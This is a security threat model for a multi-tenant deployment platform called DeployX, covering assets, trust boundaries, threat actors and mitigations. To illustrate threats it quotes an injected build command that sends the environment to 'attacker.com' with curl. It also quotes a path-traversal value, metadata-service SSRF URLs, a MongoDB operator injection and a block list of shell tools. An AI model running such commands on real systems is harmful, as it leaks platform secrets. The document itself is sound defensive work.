# DeployX Security Threat Model & Risk Analysis

## Executive Summary

DeployX is an automated multi-tenant continuous deployment platform providing static and dynamic hosting, build runner orchestration, GitHub repository synchronization, and Cloudflare Pages edge delivery. Because DeployX ingests arbitrary third-party code, executes build instructions, orchestrates OAuth credentials, and maintains sensitive cloud provider secrets, a formal, defense-in-depth threat model is mandatory.

This threat model outlines the platform's assets, trust boundaries, threat actors, realistic attack scenarios, mitigation controls, and residual risk acceptance criteria.

---

## 1. Asset Inventory & Classification

DeployX assets are categorized by confidentiality, integrity, and availability impact:

| Asset | Classification | Description & Storage Location | Security Objective |
| :--- | :--- | :--- | :--- |
| **User Identities & Passwords** | Critical | MongoDB Atlas `users` collection (`passwordHash` with bcrypt 12-rounds, salting, pepper) | Confidentiality, Tamper Resistance |
| **OAuth Access & Refresh Tokens** | Critical | GitHub and Google OAuth tokens in `integrations` collection, encrypted via AES-256-GCM | Confidentiality, Revocation |
| **MFA TOTP Secrets** | Critical | RFC 6238 Base32 seeds in `users.mfaSecretEncrypted` (`mfa:v1:` AES-256-GCM with IV and auth tag) | Zero Plaintext Exposure, Replay Defense |
| **MFA Emergency Recovery Codes** | Critical | SHA-256 salted hashes in `users.mfaRecoveryCodes` | Single-use consumption, Zero Plaintext Storage |
| **Session Credentials (JWTs)** | High | HTTP-only, SameSite=Lax, Secure cookie `session` signed with HMAC-SHA256 (`tokenVersion` revocation) | Fixation Defense, Invalidation |
| **Cloudflare Provider Credentials** | Critical | Server environment variable `CLOUDFLARE_API_TOKEN` & `CLOUDFLARE_ACCOUNT_ID` | Isolated from child processes and client bundles |
| **Build Infrastructure & Workers** | High | Isolated OS temp workspaces (`os.tmpdir()/deployx-builds/<deploymentId>`) | Process confinement, Resource limits, Secret isolation |
| **Deployment Artifacts & Output Dirs** | Medium | User build outputs (`.next`, `dist`, `out`) validated against path traversal | Containment within build sandbox |
| **Build Logs & Execution Traces** | Medium | Recorded in MongoDB `deployments.logs` and stream output | Mandatory multi-pattern secret scrubbing & redaction |
| **User Profile Avatars** | Low-Medium | Disk storage `/public/uploads/avatars/` | Magic byte validation, MIME verification, 2MB size cap |
| **GitHub Webhook Secrets** | High | Encrypted per-project secrets in `projects.webhookSecret` | HMAC-SHA256 signature verification, Replay defense |

---

## 2. Trust Boundaries & Architecture Diagram

```
+-----------------------------------------------------------------------------------+
|                                  UNTRUSTED NETWORK                                |
|  [External Attacker]       [Malicious User]         [Third-Party GitHub / Google] |
+------------------------------------------+----------------------------------------+
                                           | HTTPS (TLS 1.3)
                                           v
+-----------------------------------------------------------------------------------+
| TRUST BOUNDARY 1: Web Application Firewall & Security Headers                     |
|  - Content Security Policy (strict script/style/connect/img restrictions)         |
|  - Strict-Transport-Security (HSTS 2 years, includeSubDomains, preload)           |
|  - Anti-clickjacking (X-Frame-Options: DENY, frame-ancestors 'none')              |
|  - MIME-sniffing prevention (X-Content-Type-Options: nosniff)                     |
|  - Distributed Rate Limiter (IP-based, Account-based, Endpoint-specific)          |
+------------------------------------------+----------------------------------------+
                                           | Validated Requests
                                           v
+-----------------------------------------------------------------------------------+
| TRUST BOUNDARY 2: Application Routing & Authentication Controller                 |
|  - Jose HS256 JWT Verification & Token Version Revocation Checking                |
|  - PKCE S256 & Cryptographic Nonce/State Validation for OAuth                     |
|  - Dual-Factor Challenge Interception (withholding sessions for MFA accounts)     |
|  - CSRF Token Validation & Same-Origin Verification                               |
+------------------------------------------+----------------------------------------+
                                           | Authenticated Session
                                           v
+-----------------------------------------------------------------------------------+
| TRUST BOUNDARY 3: Multi-Tenant Data Isolation & API Authorization                 |
|  - Strict Scoping: All queries enforce { userId: session.userId }                  |
|  - Object-Level Authorization (IDOR Defense on Projects, Deployments, Domains)    |
|  - Mass-Assignment Prevention (Whitelisted schema updates only)                   |
+---------------------+--------------------+----------------------------------------+
                      |                    |
                      v                    v
+-----------------------------+  +--------------------------------------------------+
| TRUST BOUNDARY 4: Database  |  | TRUST BOUNDARY 5: Sandboxed Build Runner         |
|  - MongoDB Atlas over TLS   |  |  - Execution Sandbox: Whitelisted Executables    |
|  - Mongoose strict schemas  |  |  - Shell Injection Defense (No $(), `, cmd, nc)  |
|  - Sanitized regex queries  |  |  - Path Traversal Defense (validatePathInside)   |
|  - Zero plain secret fields |  |  - Stripped Environment (NO platform secrets)    |
+-----------------------------+  |  - 5-Minute Execution Timeout with Tree Killing  |
                                 |  - Automated Secret Redaction on all Log Streams |
                                 +--------------------------------------------------+
```

---

## 3. Threat Actors & Threat Scenarios

### Actor 1: Unauthenticated External Adversary
- **Motivation:** Account takeover, denial of service, credential stuffing, exploiting API endpoints.
- **Attack Vectors:**
  - Brute-forcing password login endpoints.
  - Brute-forcing 6-digit MFA challenge or email verification codes.
  - Replaying OAuth state or tampered JWTs.
  - Submitting oversized payloads to cause memory exhaustion.
- **Mitigation:**
  - Dual-layer rate limiting: IP rate limit (25 req/15 min) + account rate limit (5 failed attempts/15 min).
  - Short-lived, single-use `AuthChallenge` tokens (5 min TTL, 5 max attempts).
  - HMAC-signed CSRF tokens, secure cookie attributes (`HttpOnly`, `SameSite=Lax`, `Secure`).
  - Request body limits (1MB for JSON/webhooks, 2MB for avatars).

### Actor 2: Malicious Authenticated Tenant (Cross-Account Adversary)
- **Motivation:** Infiltrating another tenant's repositories, reading build logs, hijacking domains, modifying deployment configs.
- **Attack Vectors:**
  - Insecure Direct Object References (IDOR): guessing or substituting Project ID or Deployment ID in URL paths (`/api/projects/[id]`, `/api/deployments/[id]/logs`).
  - Cross-tenant redeploy triggers (`/api/deployments/[id]/redeploy`).
  - Tampering with shared database objects via MongoDB operator injection (`{ "$gt": "" }`).
- **Mitigation:**
  - Mandatory server-side ownership checks: every database lookup filters strictly on `userId: session.userId` or validates project ownership before access.
  - Schema-enforced Mongoose document updates; prohibition of direct client query objects.
  - 404 responses for unauthorized object lookups to avoid revealing object existence.

### Actor 3: Malicious Repository Code / Supply-Chain Compromise
- **Motivation:** Running malicious scripts (`package.json` scripts, `buildCommand`) to access host platform secrets, open reverse shells, or pivot to the internal network.
- **Attack Vectors:**
  - Injecting shell metacharacters (`npm run build; curl attacker.com/$(env)`).
  - Using path traversal in `outputDirectory` (`../../etc/passwd`).
  - Calling Cloudflare / AWS metadata IP `169.254.169.254` to steal instance identity tokens.
  - Stealing `MONGODB_URI`, `JWT_SECRET`, `CLOUDFLARE_API_TOKEN`, or `MFA_ENCRYPTION_KEY` from process environment.
- **Mitigation:**
  - `validateBuildCommand`: strict allowlist of authorized compilers/tools (`npm`, `pnpm`, `yarn`, `bun`, `next`, `vite`, `wrangler`); forbidden patterns (`$()`, backticks, `powershell`, `cmd`, `bash`, `nc`, `curl`, `wget`).
  - `validateOutputDirectory`: prohibits `..`, leading slashes, Windows drive letters.
  - `executeSandboxedCommand`: whitelist-only process environment; platform secrets (`MONGODB_URI`, `JWT_SECRET`, `CLOUDFLARE_API_TOKEN`, `MFA_ENCRYPTION_KEY`, etc.) are explicitly stripped from child process environment.
  - Process tree kill after timeout (300s).
  - Log scrubbing: all stdout/stderr streams pass through `redactSensitiveData()`.

### Actor 4: SSRF (Server-Side Request Forgery) Adversary
- **Motivation:** Forcing the server to fetch sensitive internal endpoints, cloud metadata services, or loopback administrative interfaces.
- **Attack Vectors:**
  - Passing internal URLs (`http://169.254.169.254/latest/meta-data`, `http://localhost:3000/api/admin`) as webhooks or custom domains.
  - Exploiting DNS rebinding or redirect hops.
- **Mitigation:**
  - Dedicated SSRF validator (`lib/security/ssrf.ts`):
    - Blocks loopback (`127.0.0.0/8`, `::1`), private RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), carrier-grade NAT (`100.64.0.0/10`), multicast (`224.0.0.0/4`), and reserved addresses.
    - Prohibits non-HTTP/HTTPS protocols (`file:`, `gopher:`, `ftp:`).
    - Resolves DNS and validates resolved IPs; intercepts manual redirects with re-validation on every hop.

---

## 4. Threat Matrix Summary

| Threat ID | Threat Description | Severity | Mitigation Status | Verification Evidence |
| :--- | :--- | :--- | :--- | :--- |
| **TH-01** | Account Takeover via Brute-Force Password | High | PASS | Dual rate limiting (IP + Account), 12-round bcrypt |
| **TH-02** | MFA Bypass or Code Replay | Critical | PASS | Server challenge interception, timestep replay check, hashed single-use recovery codes |
| **TH-03** | Insecure Account Linking (OAuth) | Critical | PASS | Strict rejection of unverified account takeover; manual credential verification required |
| **TH-04** | IDOR & Cross-Tenant Data Access | Critical | PASS | Server-enforced `userId: session.userId` across all 50 API routes |
| **TH-05** | Build Runner Command & Shell Injection | Critical | PASS | Executable whitelist, subshell banning, path traversal validation |
| **TH-06** | Platform Secret Leakage to Build Code | Critical | PASS | Stripped environment whitelist; exclusion of `MONGODB_URI`, `JWT_SECRET`, `CLOUDFLARE_*` |
| **TH-07** | Sensitive Data Exposure in Build Logs | High | PASS | Multi-pattern regex redaction and environment token scrubbing on all log lines |
| **TH-08** | SSRF against Cloud Metadata | High | PASS | Dedicated IP range validator blocking `169.254.169.254`, loopback, and RFC 1918 subnets |
| **TH-09** | Webhook Forgery & Replay | High | PASS | GitHub HMAC-SHA256 signature verification and delivery ID deduplication cache |
| **TH-10** | Malicious File Upload (Web Shell) | High | PASS | Magic-byte file signature validation (JPEG/PNG/WebP), 2MB size cap, sanitized filenames |
| **TH-11** | Cross-Site Scripting (XSS) & Clickjacking | Medium | PASS | Strict CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff |
| **TH-12** | CSRF on Sensitive Endpoints | Medium | PASS | SameSite=Lax cookies, HMAC-SHA256 CSRF token validation, origin checking |
